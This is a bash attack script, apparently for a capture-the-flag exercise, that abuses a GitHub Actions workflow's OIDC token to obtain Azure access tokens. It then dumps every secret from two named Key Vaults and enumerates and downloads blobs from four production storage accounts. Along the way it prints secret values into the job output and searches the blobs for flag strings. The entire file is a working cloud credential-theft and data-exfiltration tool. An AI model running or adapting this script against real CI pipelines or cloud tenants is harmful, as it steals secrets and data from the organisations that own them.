#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
oidc(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$1" --data-urlencode "scope=$2" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(oidc "$J" "https://vault.azure.net/.default")
MT=$(oidc "$J" "https://management.azure.com/.default")
ST=$(oidc "$J" "https://storage.azure.com/.default")
for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  echo "###### VAULT $V"
  ids=$(curl -sS "https://$V.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json
try:
 d=json.load(sys.stdin)
 [print(x["id"]) for x in d.get("value",[])] if "value" in d else print("ERR",d.get("error",{}).get("code"))
except Exception as e: print("ERRX")')
  echo "$ids"
  for id in $ids; do
    case "$id" in https*) nm=${id##*/}; val=$(curl -sS "$id?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))'); echo "SECRET $V/$nm = $val";; esac
  done
done
echo "###### STORAGE (AAD data-plane) st_len=${#ST}"
for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "== SA $SA =="
  conts=$(curl -sS "https://$SA.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" | grep -oE "<Name>[^<]+</Name>" | sed -E 's/<\/?Name>//g')
  echo "containers: $conts"
  for c in $conts; do
    blobs=$(curl -sS "https://$SA.blob.core.windows.net/$c?restype=container&comp=list" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" | grep -oE "<Name>[^<]+</Name>" | sed -E 's/<\/?Name>//g')
    for b in $blobs; do
      echo "  BLOB $SA/$c/$b"
      body=$(curl -sS "https://$SA.blob.core.windows.net/$c/$b" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" | head -c 1500)
      echo "$body" | grep -aoiE "DFCD\{[^}]*\}" && echo "   ^FLAG in $SA/$c/$b"
    done
  done
done
echo "=== END ==="
